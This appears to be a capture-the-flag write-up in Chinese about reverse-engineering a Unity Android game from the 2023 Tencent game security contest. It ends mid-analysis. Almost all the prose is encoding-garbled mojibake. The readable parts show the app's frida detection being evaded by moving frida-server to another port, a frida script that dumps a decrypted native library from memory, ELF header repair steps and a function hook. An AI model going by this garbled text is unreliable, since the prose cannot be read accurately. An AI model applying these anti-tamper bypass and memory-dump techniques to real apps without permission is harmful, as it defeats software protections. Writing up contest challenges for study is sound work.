ç›´åˆ°æ³¨å†Œæœºå†™å®Œä¹‹åçºµè§‚æ•´ä¸ªè§£é¢˜è¿‡ç¨‹ï¼ŒçœŸçš„æ˜¯å­¦åˆ°äº†å¾ˆå¤š il2CppDumper æ˜¯åˆ†æ unity æ¸¸æˆçš„åŸºç¡€ï¼Œèƒ½æœ‰å¥½çš„å¼€å¤´å…¨é ç«™åœ¨å·¨äººçš„è‚©è†€ä¸Š è¿è¡Œæ—¶è§£å¯† so æ–‡ä»¶ï¼Œè®©æˆ‘é¦–æ¬¡å°è¯•å»æ‰‹å·¥ä¿®å¤ dump ä¸‹æ¥çš„ so libsec2023.so ä¸­çš„åè°ƒè¯•è®©æˆ‘å­¦ä¼šä½¿ç”¨åœ¨å®‰å“æ‰‹æœºä¸­æ–­ä¸‹ç¡¬ä»¶æ–­ç‚¹çš„å·¥å…· rwProcMem33, ä¹Ÿå¼€å§‹ç¬¬ä¸€æ¬¡ç¼–è¯‘å®‰å“å†…æ ¸ï¼Œç»å†äº†ä¸¤ä¸‰ä¸ªä¸çœ ä¹‹å¤œ ç¬¬ä¸€çœ¼è§åˆ° CSEL-BR å’Œ CSET-BR ç»“æ„çš„èŠ±æŒ‡ä»¤è®©æˆ‘æ¯«æ— å¤´ç»ªï¼Œä¹Ÿè®©æˆ‘å¼€å§‹æ€è€ƒ frida-stalker ä¸ unicorn çš„åŒºåˆ«æ‰€åœ¨ï¼Œæœ€ç»ˆæˆ‘é€‰æ‹©ä½¿ç”¨ frida-stalker è¾…åŠ©åˆ†æï¼ŒIDApython æ‰¹é‡å»èŠ±çš„æ–¹æ³•ï¼Œæ•ˆæœå¾ˆå¥½ BlackObfuscator æ··æ·†è®©æˆ‘æƒ³èµ·äº†è¢« ollvm çš„æ§åˆ¶æµå¹³å¦åŒ–æ”¯é…çš„ææƒ§ï¼Œä¸€ç­¹è«å±•ä¹‹é™…ï¼Œè¿™ä¸ªæœˆæœ€æ–°çš„å·¥å…· Jeb5.1 ç«Ÿç„¶èƒ½å®Œç¾å»é™¤ BlackObfuscator æ··æ·†ï¼Œç€å®è®©æˆ‘æƒŠå–œä¸å·² åœ¨æ¢ç´¢ vm çš„è¿‡ç¨‹ï¼Œæˆ‘ä¹Ÿæ…¢æ…¢çš„æ‘¸ç´¢å‡ºäº† vm é¢˜å‹çš„è§£é¢˜æ–¹æ³•ï¼Œæˆ–è®¸æœªæ¥é‡åˆ° vm æˆ‘ä¹Ÿèƒ½æ¸¸åˆƒæœ‰ä½™äº† å‰è¨€å†™çš„æœ‰ç‚¹é•¿äº†ï¼Œä¹Ÿç®—æ˜¯æˆ‘åœ¨è¿™åŠå¹´å¯¹äºè¿™é“å®‰å“é¢˜çš„æ„Ÿæ‚Ÿå§å“ˆå“ˆï¼Œè™½ç„¶æ˜¯å®‰å“æ–¹å‘åˆèµ›é¢˜ï¼Œä½†æ˜¯å¯¹æˆ‘æ•´ä¸ªå®‰å“é€†å‘çš„å­¦ä¹ è¿‡ç¨‹æ„ä¹‰éå‡¡ï¼Œè¿™ç¯‡æ–‡ç« æˆ‘ä¹Ÿå†™çš„å°½å¯èƒ½çš„è¯¦ç»†ï¼Œå‰åçš„æ€ç»´ä¹Ÿå°½é‡é¿å…è·³è·ƒï¼Œæ¯ä¸€æ­¥çš„æ“ä½œåŸºæœ¬ä¸Šéƒ½æ˜¯æœ‰æ®å¯ä¾çš„ï¼Œä¸ºä¹‹åä¹ŸåŒæ ·æƒ³è¦å¤ç°è¿™é“èµ›é¢˜çš„æœ‹å‹å°½ä¸€ç‚¹ç»µè–„ä¹‹åŠ› é¢˜ç›®å¯ä»¥åœ¨è…¾è®¯æ¸¸æˆå®‰å…¨ç«èµ›å®˜ç½‘ä¸‹è½½ ä¸‹è½½é“¾æ¥ æˆ‘åœ¨ github é‡Œé¢ä¹Ÿå­˜äº†ä¸€ä»½ä¸Šå» å¤‡ç”¨ä¸‹è½½é“¾æ¥ # åˆæ¢ apk é¦–å…ˆæˆ‘ä»¬é€šè¿‡ jadx åç¼–è¯‘ mouse_pre.aligned.signed.apk , é€šè¿‡æŸ¥çœ‹ AndroidManifest.xml å¯ä»¥çŸ¥é“ä¸‹åˆ—å…³é”®ä¿¡æ¯ åŒ…å: com.com.sec2023.rocketmouse.mouse å…¥å£: com.unity3d.player.UnityPlayerActivity è§£å‹è¯¥ apk, é€šè¿‡æŸ¥çœ‹ lib æ–‡ä»¶å¤¹å†…çš„å†…å®¹ï¼Œæˆ‘ä»¬å‘ç°äº† libil2cpp.so # å°è¯•ä½¿ç”¨ Il2CppDumper è·å–ç¬¦å·ä¿¡æ¯ æˆ‘ä»¬ä½¿ç”¨ Il2CppDumper å°è¯•è§£å¯† global-metadata.dat , ä½†æ˜¯å´å¤±è´¥äº† çœ‹äº†ä¸€ä¸‹ global-metadata.dat æ˜¯æ²¡æœ‰åŠ å¯†çš„ æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨ ida åç¼–è¯‘ libil2cpp.so , å‘ç°è¢«åŠ å¯†äº† # dump è§£å¯†åçš„ libil2cpp.so æ¥ä¸‹æ¥æˆ‘å‡†å¤‡ç”¨ frida æ¥æŠŠè§£å¯†åçš„ libil2cpp.so ä»å†…å­˜ä¸­ dump ä¸‹æ¥ ä½†æ˜¯å½“æˆ‘ç”¨ frida å°†ä»£ç æ³¨å…¥è¿›å»åï¼Œapk æç¤º hack detect , ç„¶åå°±é€€å‡ºäº† ä¹‹åæˆ‘ä¸ç”¨ frida æ³¨å…¥è¿™ä¸ª apk, ä½†æ˜¯åå°ä¾æ—§è¿è¡Œç€ frida-server,apk ä¾ç„¶å¼¹å‡º hack detect åé€€å‡º é€šè¿‡è¿™ä¸€ç‚¹æˆ‘å¤§è‡´å¯ä»¥åˆ¤æ–­å®ƒçš„æ£€æµ‹æ–¹å¼æœ‰è¿™ä¸¤ç§å¯èƒ½ æ£€æµ‹è¿è¡Œçš„ç¨‹åºåç§°æœ‰æ²¡æœ‰ frida-server æ£€æµ‹ frida-server çš„ç«¯å£ æˆ‘ä»¬ä¸€ä¸ªä¸€ä¸ªå»éªŒè¯ä¸€ä¸‹ é¦–å…ˆæˆ‘ä»¬æŠŠåå°è¿è¡Œçš„ frida-server åç§°æ”¹æˆ fs è¯•è¯• blueline:/data/local/tmp # ./fsä¿®æ”¹å®Œåä¾æ—§å¼¹å‡º hack detect é‚£æˆ‘ä»¬å†å»è¯•ä¸€è¯•ä¿®æ”¹ frida-server çš„ç«¯å£ blueline:/data/local/tmp # ./fs -l 0.0.0.0:1234ç«¯å£ä¿®æ”¹ä¹‹åç”¨ frida æ³¨å…¥ä¹Ÿä¸å¼¹çª—äº† ç°åœ¨æˆ‘ä»¬å¯ä»¥ç”¨ frida æŠŠè§£å¯†åçš„ libil2cpp.so dump ä¸‹æ¥ï¼Œè„šæœ¬å¦‚ä¸‹ function dump_so(so_name) &#123; Java.perform(function () &#123; var currentApplication = Java.use(\"android.app.ActivityThread\").currentApplication(); var dir = currentApplication.getApplicationContext().getFilesDir().getPath(); var libso = Process.getModuleByName(so_name); console.log(\"[name]:\", libso.name); console.log(\"[base]:\", libso.base); console.log(\"[size]:\", ptr(libso.size)); console.log(\"[path]:\", libso.path); var file_path = dir + \"/\" + libso.name + \"_\" + libso.base + \"_\" + ptr(libso.size) + \".so\"; var file_handle = new File(file_path, \"wb\"); if (file_handle &amp;&amp; file_handle != null) &#123; Memory.protect(ptr(libso.base), libso.size, 'rwx'); // å¦‚æœæŠ¥é”™ä¸º Error: access violation accessing, é‚£ä¹ˆå¯ä»¥å°è¯•æ·»åŠ ä¸‹é¢çš„è¿™ä¸€è¡Œä»£ç ï¼Œlibso.base åŠ ä¸Šçš„å€¼æ˜¯é€šè¿‡ address (access violation accessing)-address (base) è®¡ç®—å‡ºæ¥çš„ //Memory.protect(ptr(libso.base.add(0x13b7000)), libso.size-0x13b7000, 'rwx'); var libso_buffer = ptr(libso.base).readByteArray(libso.size); file_handle.write(libso_buffer); file_handle.flush(); file_handle.close(); console.log(\"[dump]:\", file_path); &#125; &#125;);&#125;rpc.exports = &#123; dump_so: dump_so&#125;;åœ¨ä½¿ç”¨ frida è¿è¡Œè„šæœ¬ä¹‹å‰éœ€è¦æ³¨æ„å»åšä¸€ä¸‹ç«¯å£è½¬å‘ adb forward tcp:1234 tcp:1234éšåè¿›è¡Œ frida æ³¨å…¥ frida -H 127.0.0.1:1234 -l \"D:\\frida\\sec2023\\global-metadata_dump.js\" -f \"com.com.sec2023.rocketmouse.mouse\" # å†æ¬¡ä½¿ç”¨ Il2CppDumper è·å–ç¬¦å·ä¿¡æ¯ ç›´æ¥æŠŠ dump ä¸‹æ¥çš„ libil2cpp.so æ”¾åˆ° Il2CppDumper ä¸­ï¼ŒæˆåŠŸè·å–ç¬¦å· # ä¿®å¤ dump ä¸‹æ¥çš„ so å¯¹äº dump ä¸‹æ¥çš„ so æ–‡ä»¶ï¼Œæ‰€æœ‰çš„æ®µ (segment) å’ŒèŠ‚ (section) çš„åç§»éƒ½æ˜¯åœ¨è™šæ‹Ÿç©ºé—´ä¸­çš„åç§» (å³æ˜ å°„åˆ°è¿›ç¨‹ç©ºé—´çš„è™šæ‹Ÿåœ°å€åç§»), ä½†é™æ€åˆ†æå·¥å…·åˆ†æ so æ—¶æ‰€ä½¿ç”¨çš„åç§»ä»ç„¶ä¸ºåœ¨å®é™…æ–‡ä»¶ä¸­çš„åç§» (å³ç›¸å¯¹äºæ–‡ä»¶å¼€å¤´çš„å­—èŠ‚åç§»é‡), é”™è¯¯çš„åç§»å¯¼è‡´é™æ€åˆ†æå·¥å…·å¦‚ IDA ç­‰æ— æ³•åˆ†æ dump ä¸‹æ¥çš„ so æ‰€ä»¥æˆ‘ä»¬éœ€è¦å°† segment å’Œ section åœ¨å®é™…æ–‡ä»¶ä¸­çš„åç§»æ›¿æ¢ä¸ºåœ¨è™šæ‹Ÿç©ºé—´ä¸­çš„åç§»ï¼Œè¿™äº›åç§»ç”± program header table å’Œ secion header table å†…çš„æˆå‘˜æŒ‡å‡º æˆ‘ä»¬å°† libil2cpp.so å’Œ libil2cpp.so_0x712a997000_0x13cc000.so ä¸€å¹¶æ‹–å…¥ 010 editor ä¸­ï¼Œä¸¤ä¸ªæ–‡ä»¶ç›¸äº’å¯¹æ¯”è¿›è¡Œä¿®å¤ åœ¨ 010editor ä¸­å¤åˆ¶ä¸€ä¸ªæˆå‘˜çš„å€¼åˆ°å¦ä¸€ä¸ªæˆå‘˜ä¸­ï¼Œåªéœ€è¦åœ¨è½¯ä»¶ç•Œé¢çš„ Template Results ä¸­å•å‡»æƒ³è¦å¤åˆ¶çš„å€¼æŒ‰ä¸‹ Ctrl + Shift + C , ç„¶åå•å‡»éœ€è¦æ›¿æ¢çš„å€¼ï¼ŒæŒ‰ä¸‹ Ctrl + Shift + V å³å¯å®Œæˆæ›¿æ¢ # ä¿®æ­£ æ®µ (segment) çš„åç§» æ®µ (segment) çš„ä½ç½®å’Œå¤§å°ç”±ç¨‹åºå¤´è¡¨ (Program Header Table) ä¸­çš„è¿™å››ä¸ªæˆå‘˜å†³å®š æˆå‘˜åç§° å«ä¹‰ p_offset_FROM_FILE_BEGIN åœ¨å®é™…æ–‡ä»¶ä¸­çš„åç§» p_vaddr_VIRTUAL_ADDRESS åœ¨è™šæ‹Ÿç©ºé—´ä¸­çš„åç§» p_filesz_SEGMENT_FILE_LENGTH åœ¨å®é™…æ–‡ä»¶ä¸­çš„å¤§å° p_memsz_SEGMENT_RAM_LENGTH åœ¨è™šæ‹Ÿç©ºé—´ä¸­çš„å¤§å° åœ¨ libil2cpp.so_0x712a997000_0x13cc000.so ä¸­æˆ‘ä»¬å°† program_header_table ä¸­æ¯ä¸€ä¸ª element çš„ p_vaddr_VIRTUAL_ADDRESS çš„å€¼å¤åˆ¶åˆ° p_offset_FROM_FILE_BEGIN , p_memsz_SEGMENT_RAM_LENGTH çš„å€¼å¤åˆ¶åˆ° p_filesz_SEGMENT_FILE_LENGTH # ä¿®æ­£ èŠ‚å¤´è¡¨ (secion header table) çš„åç§» èŠ‚å¤´è¡¨ (secion header table) çš„ä½ç½®åœ¨æœ€åä¸€ä¸ªæ®µ (segment) ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥ä» ELF æ–‡ä»¶çš„ Execution View ç›´è§‚çœ‹å‡º ç”±ä¸‹å›¾æ‰€ç¤ºï¼Œ libil2cpp.so_0x712a997000_0x13cc000.so ä¸­ section_header_table åœ¨å®é™…æ–‡ä»¶ä¸­çš„åç§»ä¸º 0x11AB778 , æˆ‘ä»¬éœ€è¦å°†å…¶ä¿®æ”¹ä¸ºåœ¨è™šæ‹Ÿç©ºé—´ä¸­çš„åç§»ï¼Œè¿™ä¸ªå€¼ä¸º 0x13CB778 , è®¡ç®—è¿‡ç¨‹å¦‚ä¸‹ï¼Œæ­¤å¤„æ‰€æ¶‰åŠè®¡ç®—çš„æˆå‘˜çš„å€¼æ˜¯åœ¨ program_header_table çš„æœ€åä¸€ä¸ª element , å³ program_table_entry64_program_table_element[10] section_header_table åœ¨è™šæ‹Ÿç©ºé—´ä¸­çš„åç§»: 0x13CB778 = 0x00000000013BC000 + 0xF778 = p_vaddr_VIRTUAL_ADDRESS + p_memsz_SEGMENT_RAM_LENGTH Section Header Table å’Œ Program Header Table å¹¶ä¸æ˜¯ä¸€å®šè¦ä½äºæ–‡ä»¶å¼€å¤´å’Œç»“å°¾çš„ï¼Œå…¶ä½ç½®ç”± ELF Header æŒ‡å‡º å†³å®š section_header_table èµ·å§‹åœ°å€çš„æˆå‘˜ä¸º elf_header-&gt;e_shoff_SECTION_HEADER_OFFSET_IN_FILE , ä½ç½®å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œåœ¨ä¿®æ”¹å®Œæˆåï¼ŒæŒ‰ä¸‹ F5 é‡æ–°è¿è¡Œæ¨¡æ¿ ELF.bt # ä¿®è¡¥ section çš„å†…å®¹ åœ¨æˆ‘ä»¬ä¿®æ­£ èŠ‚å¤´è¡¨ (secion header table) çš„åç§»åï¼ŒèŠ‚å¤´è¡¨æ‰€åœ¨çš„åŒºåŸŸæ˜¯æ²¡æœ‰å†…å®¹çš„ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæ‰€ä»¥éœ€è¦ä» libil2cpp.so ä¸­å¤åˆ¶èŠ‚ (section) çš„å†…å®¹åˆ° dump ä¸‹æ¥çš„ so ä¸­ æˆ‘ä»¬åœ¨ libil2cpp.so ç‚¹å‡» struct section_header_table å¹¶æŒ‰ä¸‹ Ctrl + Shift + C , ç„¶åå›åˆ° libil2cpp.so_0x712a997000_0x13cc000.so ä¸­ï¼Œé€‰ä¸­ section_header_table ç„¶åæŒ‰ä¸‹ Ctrl + Shift + V , æŒ‰ä¸‹ F5 é‡æ–°è¿è¡Œæ¨¡æ¿ ELF.bt # æ¢å¤èŠ‚ (section) çš„åç§° å¯ä»¥å‘ç°ä¿®è¡¥äº†èŠ‚ (section) çš„å†…å®¹ä¹‹åï¼Œsection çš„åç§°ä¾æ—§æ˜¯ä¹±ç  è¿™æ˜¯ä»€ä¹ˆåŸå› å‘¢ï¼Ÿ ELF æ–‡ä»¶ä¸­çš„æ¯ä¸ª section éƒ½æ˜¯æœ‰åå­—çš„ï¼Œæ¯”å¦‚ .data ã€ .text ã€ .rodata ï¼Œæ¯ä¸ªåå­—éƒ½æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œæ—¢ç„¶æ˜¯å­—ç¬¦ä¸²å°±éœ€è¦ä¸€ä¸ªå­—ç¬¦ä¸²æ± æ¥ä¿å­˜ï¼Œè€Œè¿™ä¸ªå­—ç¬¦ä¸²æ± ä¹Ÿæ˜¯ä¸€ä¸ª section ï¼Œæˆ–è€…è¯´å‡†å¤‡ä¸€ä¸ª section ç”¨æ¥ç»´æŠ¤ä¸€ä¸ªå­—ç¬¦ä¸²æ± ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²æ± ä¿å­˜äº†å…¶ä»– section ä»¥åŠå®ƒè‡ªå·±çš„åå­—ã€‚è¿™ä¸ªç‰¹æ®Šçš„ section å«åš .shstrtab ï¼Œæ‰€æœ‰ section çš„å¤´éƒ¨æ˜¯è¿ç»­å­˜æ”¾åœ¨ä¸€èµ·çš„ï¼Œç±»ä¼¼ä¸€ä¸ªæ•°ç»„ï¼Œ e_shstrndx å˜é‡æ˜¯ .shstrtab åœ¨è¿™ä¸ªæ•°ç»„ä¸­çš„ä¸‹æ ‡ã€‚ é¦–å…ˆæˆ‘ä»¬è¦æ˜ç™½ section çš„åç§°æ˜¯å¦‚ä½•é€šè¿‡ç´¢å¼•æ‰¾åˆ°çš„ï¼Œåœ¨ libil2cpp.so_0x712a997000_0x13cc000.so ä¸­ï¼Œæ‰¾åˆ° elf_header-&gt;e_shtrndx_STRING_TABLE_INDEX , è¿™ä¸ªçš„å€¼ä¸º 26 (0x1A), è¯´æ˜äº† section_header_table-&gt;section_table_element[26] å­˜å‚¨äº†æ‰€æœ‰ section çš„åç§° section_header_table-&gt;section_table_element[26] ä¸­ s_offset çš„å€¼å†³å®šäº† section çš„åç§°å°†ä» 1199370h å»ç´¢å¼• æˆ‘ä»¬å¯ä»¥åœ¨ dump å‰åçš„ libil2cpp.so éƒ½è·³è½¬åˆ°è¿™ä¸ªåœ°å€å»çœ‹çœ‹ï¼Œåœ¨ 010editor ä¸­è¿›è¡Œåœ°å€è·³è½¬åªéœ€å³é”®è¯¥å€¼é€‰æ‹© Goto Address å³å¯ section çš„æ‰€æœ‰åç§°éƒ½åœ¨è¿™ä¸ªåœ°æ–¹ ä¹‹åæˆ‘ä»¬è¦å°† section çš„ç¬¦å·åç§°ä»åŸæ¥çš„ so å¤åˆ¶åˆ° dump ä¸‹æ¥çš„ so é‡Œé¢ï¼Œä½ç½®å°±æ˜¯æˆ‘ä»¬ä¹‹å‰åˆ†æå‡ºæ¥çš„ section_table_element[26] ä¸­ s_offset æ‰€æŒ‡å‘çš„ç‰©ç†å†…å­˜åœ°å€ï¼Œå³é€‰ä¸­ libil2cpp.so ä» 0x1199370h åˆ° 0x1199470h æŒ‰ä¸‹ Ctrl + Shift + C , ç„¶åå°†å…‰æ ‡ç§»åŠ¨åˆ° libil2cpp.so_0x712a997000_0x13cc000.so çš„ 119A370h å¤„ï¼ŒæŒ‰ä¸‹ Ctrl + Shift + V # ä¿®æ­£ èŠ‚ (section) çš„åç§» èŠ‚ (section) çš„ä½ç½®å’Œå¤§å°ç”±èŠ‚å¤´è¡¨ (secion_header_table) ä¸­è¿™ä¸¤ä¸ªæˆå‘˜å†³å®š æˆå‘˜åç§° å«ä¹‰ s_addr å¦‚æœæ­¤ section éœ€è¦æ˜ å°„åˆ°è¿›ç¨‹ç©ºé—´ï¼Œæ­¤æˆå‘˜æŒ‡å®šæ˜ å°„çš„èµ·å§‹åœ°å€ï¼›å¦‚ä¸éœ€æ˜ å°„ï¼Œæ­¤å€¼ä¸º 0 s_offset æ­¤ section ç›¸å¯¹äºæ–‡ä»¶å¼€å¤´çš„å­—èŠ‚åç§»é‡ã€‚å¦‚æœ section ç±»å‹ä¸º SHT_NOBITS , è¡¨æ˜è¯¥ section åœ¨æ–‡ä»¶ä¸­ä¸å ç©ºé—´ï¼Œè¿™æ—¶ sh_offset æ²¡ä»€ä¹ˆç”¨ ä¿®æ­£ èŠ‚ (section) çš„åç§»æœ‰ä¸¤æ¡è§„åˆ™ å¦‚æœ s_addr ä¸º 0, æ— éœ€ä¿®æ”¹ s_offset å¦‚æœ s_addr ä¸ä¸º 0, åˆ™å°† s_addr çš„å€¼å¤åˆ¶ç»™ s_offset ä¿®æ­£å®Œæˆåï¼ŒæŒ‰ä¸‹ F5 é‡æ–°è¿è¡Œæ¨¡æ¿ ELF.bt , å¯ä»¥å‘ç° section çš„åç§°å·²ç»æ¢å¤ï¼ŒåŒæ—¶ä¹Ÿæœ‰äº† dynamic_symbol_table # åœ¨ IDA ä¸­æ¢å¤ç¬¦å· ç„¶åï¼Œæˆ‘ä»¬å°† libil2cpp.so_0x712a997000_0x13cc000.so æ‹–å…¥ IDA ä¸­è¿›è¡Œåˆ†æï¼Œå¾…åˆ†æå®Œæˆåï¼Œç‚¹å‡»å¦‚å›¾æ‰€ç¤ºçš„é€‰é¡¹é‡æ–°å®šä½åŸºå€ä¸º 0x712a997000 , è¿™æ ·å¯ä»¥åˆ†æå‡ºæ›´å¤šçš„ç¬¦å· ä¹‹åï¼Œæˆ‘ä»¬ç‚¹å‡» File-&gt;Script file... è¿è¡Œ il2cppdumper ä¸­çš„ ida_with_struct_py3.py , éœ€è¦æ³¨æ„çš„è¿™ä¸ªè„šæœ¬éœ€è¦è¿è¡Œä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡é€‰æ‹© script.json , ç¬¬äºŒæ¬¡é€‰æ‹© il2cpp.h å¤„ç†ä¹‹åçš„æ•ˆæœå¦‚ä¸‹ # å¯»æ‰¾ OK æŒ‰é’®è°ƒç”¨çš„å‡½æ•° æ¥ä¸‹æ¥éœ€è¦çŸ¥é“è¿™ä¸ª OK æŒ‰é’®è°ƒç”¨çš„å‡½æ•° æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™ä¸ªå·¥å…· frida-il2cppDumper, ç”¨æ³•å°±ç›´æ¥ç”¨ frida æ³¨å…¥ _agent.js å°±å¯ä»¥äº† frida -H 127.0.0.1:1234 -l \"D:\\frida\\frida-il2cppDumper-main\\_agent.js\" -f \"com.com.sec2023.rocketmouse.mouse\"å½“æˆ‘ä»¬è¿›å…¥è¯¥ apk ä¹‹åï¼Œä¸‹åˆ—å‡½æ•°è¢«è°ƒç”¨ method call nameSpaze: class:SmallKeyboard methodPointer offset in IDA:466300 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:iII1i methodPointer offset in IDA:4663A8 public Void .ctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:SmallKeyboard methodPointer offset in IDA:46618C private Void Start()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:SmallKeyboard methodPointer offset in IDA:465E90 private Void oO0oOo0()&#123; &#125; method endæˆ‘ä»¬å»çœ‹ä¸€ä¸‹æœ€åè°ƒç”¨çš„è¿™ä¸ªå‡½æ•° oO0oOo0 , è¿›å…¥ IDA å»è¿›è¡Œåˆ†æï¼Œå¾ˆæ˜æ˜¾æ˜¯ç”Ÿæˆ TOKEN çš„åœ°æ–¹ å½“æˆ‘ä»¬ç‚¹å‡»å°é”®ç›˜ä¸Šçš„ OK æŒ‰é’®åï¼Œä¸‹åˆ—å‡½æ•°è¢«è°ƒç”¨ï¼Œç”±äºè°ƒç”¨çš„å‡½æ•°å¤ªå¤šï¼Œæˆ‘è¿™é‡Œä»…ä»…ä»é¦–æ¬¡è°ƒç”¨çš„å‡½æ•°å¼€å§‹ï¼Œæˆªå–äº†éƒ¨åˆ†è¾“å‡ºä½œä¸ºç¤ºä¾‹ method call nameSpaze: class:&lt;>c__DisplayClass14_0 methodPointer offset in IDA:4663B0 internal Void &lt;Start>b__0()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:SmallKeyboard methodPointer offset in IDA:465FDC private Void iI1Ii(GameObject go) &#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:SmallKeyboard methodPointer offset in IDA:465880 private Void iI1Ii(iII1i _info) &#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze: class:SmallKeyboard methodPointer offset in IDA:465AB0 private Void iI1Ii(UInt64 i1I) &#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze:OO0OoOOo class:Oo0 methodPointer offset in IDA:4660E8 public Void .ctor(UInt16[] OoOOO00, Int32 oOOO0O0O, UInt32[] OOoOO0) &#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze:OO0OoOOo class:Oo0 methodPointer offset in IDA:46A55C private Void O000O000000o()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze:OO0OoOOo class:oO0OoOOo methodPointer offset in IDA:46A4D8 private Void .cctor()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze:OO0OoOOo class:Oo0 methodPointer offset in IDA:46AD44 private Void oOOoO0o0()&#123; &#125; method end---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- method call nameSpaze:OO0OoOOo class:Oo0 methodPointer offset in IDA:46B578 private Void O00O00000o()&#123; &#125; method endSmallKeyboard ç±»è¢«è°ƒç”¨äº†å¾ˆå¤šæ¬¡ï¼Œæˆ‘ä»¬å¯ä»¥å» dump.cs é‡Œé¢æœç´¢ä¸€ä¸‹ï¼Œæ­¤å¤„å®šä¹‰äº† KeyType ä¸åŒçš„å€¼å¯¹åº”çš„å«ä¹‰ï¼Œé‚£ä¹ˆè¿™ä¸ª EnterKey å°±æ˜¯ OK æŒ‰é’®äº† å›åˆ° IDA , æˆ‘ä»¬å†å»æœç´¢ä¸€ä¸‹ SmallKeyboard , æ‰¾åˆ° SmallKeyboard__iI1Ii(SmallKeyboard_o *this, SmallKeyboard_iII1i_o *info, const MethodInfo *method) è¿™ä¸ªå‡½æ•°ï¼Œè¿™æ˜¯ä¸ KeyType æœ‰å…³çš„å‡½æ•°ï¼Œæ˜¾è€Œæ˜“è§ï¼Œæˆ‘ä»¬éœ€è¦é‡ç‚¹åˆ†æçš„æ˜¯ KeyType == 2 çš„æƒ…å†µ å¯¹äºè¿™è¡Œä»£ç ï¼Œæˆ‘çš„çŒœæµ‹æ˜¯ v13 å­˜å‚¨äº†æˆ‘è¾“å…¥çš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ frida å» hook System_Convert__ToUInt64_486054767044 çš„è¿”å›å€¼æ¥éªŒè¯æˆ‘ä»¬çš„çŒœæƒ³ function hook_native()&#123; // ç¨‹åºå…¥å£Java.perform(function() &#123; // è·å–æ¨¡å— var module = Process.getModuleByName(\"libil2cpp.so\") // è½¬ä¸ºå‡½æ•°åœ°å€ var addr=module.base.add(\"0x85b9c4\"); // è·å–å‡½æ•°å…¥å£ var func = new NativePointer(addr.toString()); console.log('[+] hook '+func.toString()) // å‡½æ•° hook é’©å­é™„åŠ  Interceptor.attach(func, &#123; onEnter: function (args) &#123; console.log('hook success'); console.log(args[0]); console.log(args[1]); &#125;, onLeave: function (retval) &#123; console.log(\"retvalue is :\", retval.toInt32()); console.log('method onleave'); &#125; &#125;);&#125;);&#125;setImmediate(function()&#123; setTimeout(hook_native, 1000);&#125;,0);å½“æˆ‘è¾“å…¥ 123456 , å¹¶ç‚¹å‡» OK æŒ‰é’®åï¼Œfrida çš„å›æ˜¾å¦‚ä¸‹ï¼Œå¯ä»¥å°è¯æˆ‘ä»¬çš„çŒœæµ‹æ˜¯æ­£ç¡®çš„ï¼Œv13 æ˜¯æˆ‘ä»¬è¾“å…¥çš„æ•°å­— v13 ä½œä¸ºå‚æ•°ä¼ å…¥äº† SmallKeyboard__iI1Ii_486050613936 å†…ï¼Œé‚£ä¹ˆè¿™åº”è¯¥å°±æ˜¯æˆ‘ä»¬è¦å¯»æ‰¾çš„åŠ å¯†é€»è¾‘ ç»è¿‡ä¸¤ä¸ª B è·³è½¬åï¼Œæˆ‘ä»¬æ¥åˆ°äº†è¿™é‡Œ è¿™æ®µæ±‡ç¼–å¾ˆæœ‰æ„æ€ï¼Œæˆ‘ä»¬å»åˆ†æä¸€ä¸‹ï¼Œ off_712BD51FF0 